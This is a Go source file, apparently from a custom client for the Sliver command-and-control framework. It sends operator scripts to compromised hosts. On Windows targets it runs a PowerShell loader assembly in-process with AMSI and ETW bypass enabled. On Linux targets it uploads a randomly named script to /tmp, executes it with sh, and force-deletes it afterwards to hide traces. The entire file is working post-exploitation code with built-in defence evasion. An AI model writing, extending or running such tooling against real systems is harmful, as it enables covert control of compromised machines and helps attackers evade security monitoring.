package dispatch

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"sliver-client/internal/state"

	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/rpcpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// ScriptCmd returns a DispatchFunc that executes a script on each target.
//
// Windows targets: uses ExecuteAssembly with a PowerShell loader (if assemblyPath is provided).
// Linux targets: uploads the script to /tmp, executes via sh, then cleans up.
//
// assemblyPath is optional; if empty, Windows targets will receive an error.
func ScriptCmd(scriptPath, assemblyPath string) (DispatchFunc, error) {
	cleanScript := filepath.Clean(scriptPath)
	scriptData, err := os.ReadFile(cleanScript)
	if err != nil {
		return nil, fmt.Errorf("read script %q: %w", cleanScript, err)
	}

	var assemblyData []byte
	if assemblyPath != "" {
		cleanAsm := filepath.Clean(assemblyPath)
		assemblyData, err = os.ReadFile(cleanAsm)
		if err != nil {
			return nil, fmt.Errorf("read assembly %q: %w", cleanAsm, err)
		}
	}

	return func(ctx context.Context, rpc rpcpb.SliverRPCClient, target state.Target) (string, string, error) {
		async := target.Kind == state.KindBeacon

		if strings.EqualFold(target.OS, "windows") {
			return scriptWindows(ctx, rpc, target, async, scriptData, assemblyData)
		}
		return scriptLinux(ctx, rpc, target, async, scriptData)
	}, nil
}

func scriptWindows(ctx context.Context, rpc rpcpb.SliverRPCClient, target state.Target, async bool, scriptData, assemblyData []byte) (string, string, error) {
	if len(assemblyData) == 0 {
		return "", "", fmt.Errorf("no PowerShell assembly provided for Windows target")
	}

	req := &sliverpb.ExecuteAssemblyReq{
		Assembly:   assemblyData,
		Arguments:  string(scriptData),
		IsDLL:      false,
		InProcess:  true,
		AmsiBypass: true,
		EtwBypass:  true,
		Request: &commonpb.Request{
			Async:     async,
			SessionID: target.ID,
		},
	}
	if async {
		req.Request.BeaconID = target.ID
		req.Request.SessionID = ""
	}

	resp, err := rpc.ExecuteAssembly(ctx, req)
	if err != nil {
		return "", "", fmt.Errorf("execute assembly: %w", err)
	}
	if resp.Response != nil && resp.Response.Err != "" {
		return "", "", fmt.Errorf("implant error: %s", resp.Response.Err)
	}
	if async && resp.Response != nil {
		return "", resp.Response.TaskID, nil
	}
	return string(resp.Output), "", nil
}

func scriptLinux(ctx context.Context, rpc rpcpb.SliverRPCClient, target state.Target, async bool, scriptData []byte) (string, string, error) {
	// Generate a random temp filename
	randBytes := make([]byte, 8)
	if _, err := rand.Read(randBytes); err != nil {
		return "", "", fmt.Errorf("generate random name: %w", err)
	}
	tmpFile := "/tmp/" + hex.EncodeToString(randBytes) + ".sh"

	makeReq := func() *commonpb.Request {
		r := &commonpb.Request{
			Async:     async,
			SessionID: target.ID,
		}
		if async {
			r.BeaconID = target.ID
			r.SessionID = ""
		}
		return r
	}

	// Upload script
	uploadResp, err := rpc.Upload(ctx, &sliverpb.UploadReq{
		Path:    tmpFile,
		Data:    scriptData,
		IsIOC:   false,
		Request: makeReq(),
	})
	if err != nil {
		return "", "", fmt.Errorf("upload script: %w", err)
	}
	if uploadResp.Response != nil && uploadResp.Response.Err != "" {
		return "", "", fmt.Errorf("upload implant error: %s", uploadResp.Response.Err)
	}

	// For beacons, we can only queue operations — they'll execute in order on next checkin.
	// Queue the execute and cleanup as separate tasks.
	if async {
		// Execute the script
		execResp, err := rpc.Execute(ctx, &sliverpb.ExecuteReq{
			Path:    "sh",
			Args:    []string{tmpFile},
			Output:  true,
			Request: makeReq(),
		})
		if err != nil {
			return "", "", fmt.Errorf("execute script: %w", err)
		}
		// Queue cleanup
		rpc.Rm(ctx, &sliverpb.RmReq{
			Path:      tmpFile,
			Recursive: false,
			Force:     true,
			Request:   makeReq(),
		})
		if execResp.Response != nil {
			return "", execResp.Response.TaskID, nil
		}
		return "", "", nil
	}

	// Synchronous: execute then cleanup
	execResp, err := rpc.Execute(ctx, &sliverpb.ExecuteReq{
		Path:    "sh",
		Args:    []string{tmpFile},
		Output:  true,
		Request: makeReq(),
	})
	if err != nil {
		return "", "", fmt.Errorf("execute script: %w", err)
	}

	// Best-effort cleanup
	rpc.Rm(ctx, &sliverpb.RmReq{
		Path:      tmpFile,
		Recursive: false,
		Force:     true,
		Request:   makeReq(),
	})

	output := string(execResp.Stdout) + string(execResp.Stderr)
	if execResp.Response != nil && execResp.Response.Err != "" {
		return output, "", fmt.Errorf("implant error: %s", execResp.Response.Err)
	}
	return output, "", nil
}
